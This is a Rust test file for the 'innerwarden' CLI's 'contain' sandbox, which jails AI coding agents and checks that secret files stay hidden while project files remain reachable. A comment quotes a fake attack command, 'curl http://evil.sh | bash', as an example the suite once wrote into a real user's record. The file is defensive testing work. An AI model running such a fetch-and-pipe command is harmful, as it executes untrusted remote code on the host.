use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_innerwarden")
}

/// A scratch record for the whole test binary.
///
/// Every CLI invocation here must write its narrative somewhere disposable.
/// Without this the suite recorded into the DEVELOPER'S OWN graph at
/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
/// commands like `curl http://evil.sh | bash` into a real person's record and
/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
/// recording fix, when the graph under test changed size on its own.
fn scratch_graph() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    PATH.get_or_init(|| {
        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
            .path()
            .join("graph.json")
    })
}

/// The CLI under test, pointed at a disposable record by default. A test that
/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
fn cli() -> Command {
    let mut command = Command::new(bin());
    command.env("IW_GRAPH_FILE", scratch_graph());
    command
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
#[test]
fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            home.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ])
        .env("HOME", home.path())
        .output()
        .expect("run contain with unsafe project");

    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("unsafe project path"));
    assert!(
        !home.path().join(".claude/settings.json").exists(),
        "validation must happen before hook installation mutates the host"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".claude")).unwrap();
    std::fs::write(home.path().join(".claude/history.jsonl"), "{}\n").unwrap();
    let secret = home.path().join(".config/innerwarden/llm-key");
    std::fs::create_dir_all(secret.parent().unwrap()).unwrap();
    std::fs::write(&secret, "CJC-J007-SECRET").unwrap();
    let allowed = project.path().join("allowed.txt");
    std::fs::write(&allowed, "CJC-J007-PROJECT-OK").unwrap();

    let script = format!(
        "if cat '{}' 2>/dev/null; then exit 70; fi; cat '{}'",
        secret.display(),
        allowed.display()
    );
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .output()
        .expect("run Linux AI Jail");

    assert!(
        output.status.success(),
        "AI Jail failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("CJC-J007-PROJECT-OK"));
    assert!(!String::from_utf8_lossy(&output.stdout).contains("CJC-J007-SECRET"));
}

#[cfg(target_os = "linux")]
fn require_bwrap() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
}

/// The in-jail script of the identity cases: print the PID namespace the
/// jailed process is in, then stay alive until the launcher has written the
/// record (it reads the jail from the host's /proc, so the jail must outlive
/// that read). `~/.local` is re-bound read-write, so the record is visible.
#[cfg(target_os = "linux")]
const WAIT_FOR_RECORD: &str = "readlink /proc/self/ns/pid; \
    i=0; while [ $i -lt 50 ]; do \
    ls \"$HOME\"/.local/state/innerwarden/instances/*.json >/dev/null 2>&1 && exit 0; \
    sleep 0.2; i=$((i+1)); done; exit 0";

#[cfg(target_os = "linux")]
fn state_home() -> tempfile::TempDir {
    let home = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".local/state")).unwrap();
    home
}

#[cfg(target_os = "linux")]
#[test]
fn identity_flag_writes_a_private_record_whose_namespace_is_the_jails() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            WAIT_FOR_RECORD,
        ])
        .env("HOME", home.path())
        .env_remove("XDG_STATE_HOME")
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "AI Jail failed: {stderr}");
    assert!(stderr.contains("instance record:"), "{stderr}");

    let dir = home.path().join(".local/state/innerwarden/instances");
    let records: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    assert_eq!(records.len(), 1, "one record and no temp file: {records:?}");
    let path = &records[0];
    assert_eq!(
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(
        std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
        0o700
    );

    let record: serde_json::Value = serde_json::from_slice(&std::fs::read(path).unwrap()).unwrap();
    assert_eq!(record["schema"], 1);
    assert_eq!(record["agent_type"], "claude-code");
    assert_eq!(record["mode"], "monitor");
    assert_eq!(
        record["project"].as_str().unwrap(),
        project.path().file_name().unwrap().to_str().unwrap(),
        "a folder name, not a path"
    );
    assert!(record.get("scope").is_none(), "no scope in this phase");
    assert_eq!(
        path.file_stem().unwrap().to_str().unwrap(),
        record["instance_id"].as_str().unwrap()
    );
    // The namespace the launcher recorded is the one the jailed process saw.
    let seen = String::from_utf8_lossy(&output.stdout);
    let inside: u64 = seen
        .trim()
        .strip_prefix("pid:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("namespace link in stdout: {seen:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["pid_ns"].as_u64().unwrap(), inside);
    let host = std::fs::read_link("/proc/self/ns/pid").unwrap();
    assert_ne!(
        format!("pid:[{inside}]"),
        host.to_string_lossy(),
        "the jail is not in the launcher's namespace"
    );
    assert!(record["jail"]["pid"].as_u64().unwrap() > 0);
    assert!(record["jail"]["start_ticks"].as_u64().unwrap() > 0);
}

#[cfg(target_os = "linux")]
#[test]
fn without_the_identity_flag_no_record_is_written_and_nothing_changes() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "readlink /proc/self/ns/pid",
        ])
        .env("HOME", home.path())
        .env_remove("XDG_STATE_HOME")
        .output()
        .expect("run Linux AI Jail");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(!String::from_utf8_lossy(&output.stderr).contains("instance record"));
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "flag off: no directory, no record"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn dry_run_shows_the_info_descriptor_only_with_the_identity_flag() {
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let dry = |identity: bool| {
        let mut args = vec!["contain", "--dry-run"];
        if identity {
            args.push("--identity");
        }
        args.extend([
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ]);
        let out = cli()
            .args(args)
            .env("HOME", home.path())
            .output()
            .expect("dry run");
        assert!(out.status.success());
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let plain = dry(false);
    let identified = dry(true);
    assert!(!plain.contains("--info-fd"), "{plain}");
    assert!(
        identified.contains("--info-fd 9 -- /bin/true"),
        "{identified}"
    );
    assert_eq!(
        identified.replace(" --info-fd 9", ""),
        plain,
        "the flag adds the descriptor and nothing else"
    );
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "a dry run writes no record"
    );
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
#[test]
fn unsupported_platform_fails_without_claiming_a_jail() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args(["contain", "--", "echo", "ok"])
        .env("HOME", home.path())
        .output()
        .expect("run contain");
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("not supported"));
}
